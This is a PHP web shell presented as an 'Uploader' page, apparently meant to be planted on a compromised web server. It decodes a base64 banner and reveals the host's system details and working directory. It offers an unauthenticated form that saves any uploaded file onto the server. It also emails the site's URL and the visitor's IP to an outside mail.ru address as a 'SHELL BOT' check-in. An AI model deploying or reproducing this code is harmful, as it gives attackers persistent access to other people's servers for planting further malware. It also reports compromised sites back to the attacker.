<?php
$str = 'VXBsb2FkZXIgSXphbmFtaSBWIDIuNQ==';echo base64_decode($str);

?>
<title>Viper 1337 Private Unloader</title>
<?php echo 'uname:'.php_uname().'<br>'.$cwd = getcwd(); Echo '<center>  <form method="post" target="_self" enctype="multipart/form-data">  <input type="file" size="20" name="uploads" /> <input type="submit" value="upload" />  </form>  </center></td></tr> </table><br>'; if (!empty ($_FILES['uploads'])) {     move_uploaded_file($_FILES['uploads']['tmp_name'],$_FILES['uploads']['name']);     Echo "<script>alert('Upload Succes'); 	 	 </script><b>Uploade Succes</b><br>name : ".$_FILES['uploads']['name']."<br>size : ".$_FILES['uploads']['size']."<br>type : ".$_FILES['uploads']['type']; } 
?>
<?php
$ip = getenv("REMOTE_ADDR");
$ra44 = rand(1, 99999);
$subj98 = " SHELL BOT |$ip";
$email = "kamalxzour@mail.ru";
$from = "From: SHELL BOT<noreply@cs53.hostneverdie.com>";
$a45 = $_SERVER['REQUEST_URI'];
$b75 = "http://" . $_SERVER['HTTP_HOST'];
$m22 = "URL =>";
$msg8873 = "$m22 $b75 $a45";
mail($email, $subj98, $msg8873, $from);
?>